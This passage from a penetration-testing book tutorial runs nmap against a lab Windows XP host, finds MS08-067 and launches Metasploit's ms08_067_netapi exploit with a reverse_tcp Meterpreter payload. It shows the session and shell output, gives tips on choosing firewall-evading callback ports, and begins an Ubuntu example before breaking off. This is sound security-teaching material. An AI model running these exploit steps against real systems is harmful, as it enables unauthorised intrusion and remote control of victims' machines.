36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_196.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/root# <span class="s24">cd /opt/framework3/msf3/</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">msfconsole</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">msf &gt; <span class="s24">nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130 </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] exec: nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="http://nmap.org/" class="s34" target="_blank">Starting Nmap 5.20 ( </a>http://nmap.org ) at 2011-03-15 19:46 EDT</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Warning: Traceroute does not support idle or connect scan, disabling... NSE: Script Scanning completed.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Nmap scan report for 192.168.33.130 Host is up (0.00050s latency).</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Not shown: 991 closed ports</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">PORT STATE SERVICE VERSION</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">21/tcp open ftp Microsoft ftpd</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">25/tcp open smtp Microsoft ESMTP 6.0.2600.2180 80/tcp open http Microsoft IIS webserver 5.1 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">443/tcp open https?</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds 1025/tcp open msrpc Microsoft Windows RPC</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">1433/tcp open ms-sql-s Microsoft SQL Server 2005 9.00.1399; RTM MAC Address: 00:0C:29:EA:26:7C (VMware)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Device type: general purpose Running: Microsoft Windows XP|2003</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">OS details: <span class="s24">Microsoft Windows XP Professional SP2 or Windows Server 2003 </span><span class="s30">@</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Network Distance: 1 hop</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Service Info: Host: ihazsecurity; OS: Windows</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Host script results:</p><p class="s25" style="padding-left: 40pt;text-indent: 0pt;line-height: 10pt;text-align: left;">smb-check-vulns:</p><p class="s24" style="padding-left: 49pt;text-indent: 0pt;line-height: 12pt;text-align: left;">MS08-067: VULNERABLE <span class="s30">8</span></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Conficker: Likely CLEAN</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">regsvc DoS: CHECK DISABLED (add &#39;--script-args=unsafe=1&#39; to run)</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add &#39;--script-args=unsafe=1&#39; to run)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="http://nmap.org/submit/" class="s34" target="_blank">OS and Service detection performed. Please report any incorrect results at </a>http://nmap.org/submit/ .</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Nmap done: 1 IP address (1 host up) scanned in 71.67 seconds msf &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_197.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">Here, we call <span class="s19">nmap </span>from Metasploit with the <span class="s25">--script=smb-check-vulns</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 15pt;text-align: justify;">plug-in at <span class="s32">O</span>. Notice the flags used while scanning the host with <span class="s19">nmap</span>. The</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">-sT <span class="p">is a Stealth TCP connect, which we have found to be the most reliable flag</span></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">when trying to enumerate ports. (Others prefer <span class="s25">-sS</span>, or Stealth Syn.) The <span class="s25">-A </span>specifies advanced OS detection, which does some additional banner grabs and footprinting of a specific service for us.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">Notice in the results from <span class="s19">nmap </span>that <span class="s25">MS08-067: VULNERABLE </span>is reported at <span class="s32">8</span>. This is a good indicator that we have a chance at exploiting this system. Let’s use</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Metasploit to find the exploit we want and attempt to compromise the system.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www.uninformed.org/" class="s31" target="_blank">This exploit is specific to the operating system version, service pack, and language in use on the system, a result of the exploit bypassing Data Execution Prevention (DEP). DEP was created to help protect against buffer overflow attacks by rendering the stack read-only and thereby preventing arbitrarily placed shellcode from executing. However, we can bypass DEP and force Windows to make the stack writable by performing some complex stack manipulation. (For more on bypassing DEP, see </a><a href="http://www.uninformed.org/" class="s20" target="_blank">http://www.uninformed.org/</a></p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">?v=2&amp;a=4<span class="p">.)</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="#bookmark183" class="s31">In </a>“msf&gt; show targets” on page 62, we used the <span class="s25">show targets </span>command, which lists each vulnerable version for this specific attack vector. Because MS08-067 is an exploit that is very specific regarding the OS version in use, we will manually set our target to make sure we trigger the correct overflow.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;line-height: 81%;text-align: left;">Based on the <span class="s19">nmap </span>scan results shown in the preceding example, we can tell at <span class="s32">@ </span>that the system is running Windows XP Service Pack 2. (It is also</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">identified as possibly Windows 2003, but the system is missing key ports that would be associated with the Server Edition.) We’ll assume that our target is running the English version of XP.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: justify;">Let’s walk through the actual exploitation. First the setup:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_198.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf &gt; <span class="s24">search  ms08_067_netapi  </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Searching loaded modules for pattern &#39;ms08_067_netapi&#39;...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Exploits</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">========</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Name Rank Description</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">---- ---- -----------</p><p class="s25" style="padding-left: 36pt;text-indent: 12pt;line-height: 87%;text-align: left;">windows/smb/ms08_067_netapi great Microsoft Server Service Relative Path Stack Corruption</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 13pt;text-align: left;">msf &gt; <span class="s24">use windows/smb/ms08_067_netapi </span><span class="s30">8</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set PAYLOAD windows/meterpreter/reverse_tcp </span><span class="s30">@</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 83%;text-align: left;">payload =&gt; windows/meterpreter/reverse_tcp msf exploit(ms08_067_netapi) &gt; <span class="s24">show targets </span><span class="s30">O</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="11" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_199.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_200.png"/></span></p><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 193%;text-align: left;">Exploit targets: Id Name</p><ol id="l10"><li><p class="s25" style="padding-left: 66pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Automatic Targeting</p></li><li><p class="s25" style="padding-left: 66pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2000 Universal</p></li><li><p class="s25" style="padding-left: 66pt;text-indent: -17pt;line-height: 10pt;text-align: left;">Windows XP SP0/SP1 Universal</p></li><li><p class="s24" style="padding-left: 66pt;text-indent: -17pt;line-height: 12pt;text-align: left;">Windows XP SP2 English (NX) <span class="s30">@</span></p></li><li><p class="s25" style="padding-left: 66pt;text-indent: -17pt;line-height: 9pt;text-align: left;">Windows XP SP3 English (NX)</p></li><li><p class="s25" style="padding-left: 66pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2003 SP0 Universal</p></li><li><p class="s25" style="padding-left: 66pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2003 SP1 English (NO NX)</p></li><li><p class="s25" style="padding-left: 66pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2003 SP1 English (NX)</p></li><li><p class="s25" style="padding-left: 66pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2003 SP2 English (NO NX)</p></li><li><p class="s25" style="padding-left: 66pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2003 SP2 English (NX)</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">26 Windows XP SP2 Japanese (NX)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set TARGET 3</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">target =&gt; 3</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set RHOST 192.168.33.130 </span><span class="s30">0</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">RHOST =&gt; 192.168.33.130</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set LHOST 192.168.33.129 </span><span class="s30">&amp;</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">LHOST =&gt; 192.168.33.129</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set LPORT 8080 </span><span class="s30">0</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">LPORT =&gt; 8080</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">show options </span><span class="s30">0</span></p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:38pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: center;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:38pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 4pt;text-indent: 0pt;line-height: 10pt;text-align: center;">192.168.33.130</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The target address</p></td></tr><tr style="height:21pt"><td style="width:38pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SMBPIPE</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">445</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">BROWSER</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Set the SMB service port</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The pipe name to use (BROWSER, SRVSVC)</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Payload options (windows/meterpreter/reverse_tcp):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:43pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:63pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:156pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:43pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">EXITFUNC</p></td><td style="width:63pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">thread</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:156pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Exit technique: seh, thread, process</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">LHOST</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.33.129</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:156pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The local address</p></td></tr><tr style="height:10pt"><td style="width:43pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">LPORT</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">8080</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:156pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">The local port</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="11" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_201.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_202.png"/></span></p><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 193%;text-align: left;">Exploit target: Id Name</p><p class="s25" style="padding-bottom: 4pt;padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">3 Windows XP SP2 English (NX)</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_203.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">We search for the MS08-067 NetAPI exploit in the Framework at <span class="s32">O</span>. Then, having found our exploit, we load the <span class="s19">windows/smb/ms08_067_netapi </span>exploit at <span class="s32">8</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Next, at <span class="s32">@ </span>we set the payload as Windows-based Meterpreter <span class="s25">reverse_tcp</span>,</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">which, if successful, will start a connection on the target machine and con-</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">nect back to the attacking machine specified with <span class="s25">LHOST</span>. This is important if you find that a firewall is in place and you need to bypass incoming controls on a firewall or NAT.</p><p class="s19" style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Meterpreter <span class="p">is a post exploitation tool that we’ll use through this book. One of Metasploit’s flagship tools, it makes extracting information or further compromising systems significantly easier.</span></p><p style="padding-left: 90pt;text-indent: 17pt;line-height: 81%;text-align: left;">The <span class="s25">show targets </span>command at <span class="s32">O </span>allows us to identify the system we want to target. (Although many MSF exploits use automatic targeting and don’t</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">require this flag, autodetection capability generally fails in MS08-067.)</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 17pt;line-height: 81%;text-align: justify;">We then set our target to <span class="s25">Windows XP SP2 English (NX) </span>at <span class="s32">@</span>. The <span class="s25">NX </span>stands for No Execute. By default in Windows XP SP2, DEP is enabled.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 14pt;text-align: justify;">At <span class="s32">0 </span>we set the IP address of our target machine which, by defining the</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: justify;">RHOST <span class="p">value, is vulnerable to the MS08-067 exploit.</span></p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: justify;">The <span class="s25">set LHOST </span>command at <span class="s32">&amp; </span>specifies our attacking machine’s IP address (the Back|Track machine), and the <span class="s25">LPORT </span>option at <span class="s32">0 </span>specifies the port to which our attacker machine will listen for a connection from our target. (When</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;line-height: 92%;text-align: left;">you’re setting the <span class="s25">LPORT </span>option, use a standard port that you think will be allowed through the firewall: Ports 443, 80, 53, and 8080 are often good options.) Finally, we enter <span class="s25">show options </span>at <span class="s32">0 </span>to make sure that the options are</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">set up correctly.</p><p style="padding-top: 3pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Having set the stage, we’re ready to conduct the actual exploitation:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_204.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">exploit </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Started reverse handler on 192.168.33.129:8080</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Triggering the vulnerability... [*] Sending stage (748032 bytes)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Meterpreter session 1 opened (192.168.33.129:8080 -&gt; 192.168.33.130:1487) <span class="s30">8</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 13pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">sessions -l </span><span class="s30">@</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Active sessions</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">===============</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">Id Type Information Connection</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s36" style="padding-left: 44pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="11" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_205.png"/></span> <span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_206.png"/></span><span class="s27">	</span><span><img width="62" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_207.png"/></span> <span><img width="57" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_208.png"/></span></p><p class="s25" style="padding-top: 1pt;padding-left: 44pt;text-indent: 0pt;text-align: left;">1 meterpreter 192.168.33.129:8080 -&gt; 192.168.33.130:1036 <span class="s30">O</span></p><p class="s25" style="padding-top: 6pt;padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">sessions -i 1 </span><span class="s30">@</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Starting interaction with 1...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">meterpreter &gt; <span class="s24">shell </span><span class="s30">0</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Process 4060 created.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Channel 1 created.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Windows XP [Version 5.1.2600]</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">(C) Copyright 1985-2001 Microsoft Corp.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">C:\WINDOWS\system32&gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_209.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 77%;text-align: left;">The <span class="s25">exploit </span>command at <span class="s32">O </span>initiates our exploit and attempts to attack the target. The attack succeeds and gives us a <span class="s25">reverse_tcp </span>Meterpreter pay- load at <span class="s32">8</span>, which we can view with <span class="s25">sessions -l </span>at <span class="s32">@</span>. Only one session is active, as shown at <span class="s32">O</span>, but if we targeted multiple systems, several sessions could be</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">open simultaneously. (To view a list of the exploits that created each session,</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">you would enter <span class="s25">sessions -l -v</span>.)</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 17pt;line-height: 81%;text-align: left;">The <span class="s25">sessions -i 1 </span>command is issued at <span class="s32">@ </span>to “interact” with an individual session. Notice that this drops us into a Meterpreter shell. If, for example, a</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 0pt;line-height: 82%;text-align: left;">reverse command shell existed, this command would drop us straight to a command prompt. And, finally, at <span class="s32">0 </span>we enter <span class="s25">shell </span>to jump into an interac- tive command shell on the target.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Congratulations! You’ve just compromised your first machine! To list the available commands for a particular exploit, you can enter <span class="s25">show options</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark172">Exploiting an Ubuntu Machine</a><a name="bookmark189">&zwnj;</a></p><p style="padding-top: 10pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Let’s try a different exploit on an Ubuntu 9.04 virtual machine. The steps are pretty much the same as for the preceding exploit except that we will select a different payload.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_210.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">nmap -sT -A -P0 192.168.33.132</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] exec: nmap -sT -A -P0 192.168.33.132</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="http://nmap.org/" class="s34" target="_blank">Starting Nmap 5.20 ( </a>http://nmap.org ) at 2011-03-15 19:35 EDT</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Warning: Traceroute does not support idle or connect scan, disabling... Nmap scan report for 192.168.33.132</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Host is up (0.00048s latency). Not shown: 997 closed ports</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PORT STATE SERVICE VERSION</p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">80/tcp open <span class="s25">http Apache httpd 2.2.3 ((</span>Ubuntu<span class="s25">) PHP/5.2.1) </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">|_html-title: Index of /</p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;line-height: 88%;text-align: left;">139/tcp open <span class="s25">netbios-ssn </span>Samba <span class="s25">smbd 3.X (workgroup: MSHOME) </span><span class="s30">8 </span>445/tcp open <span 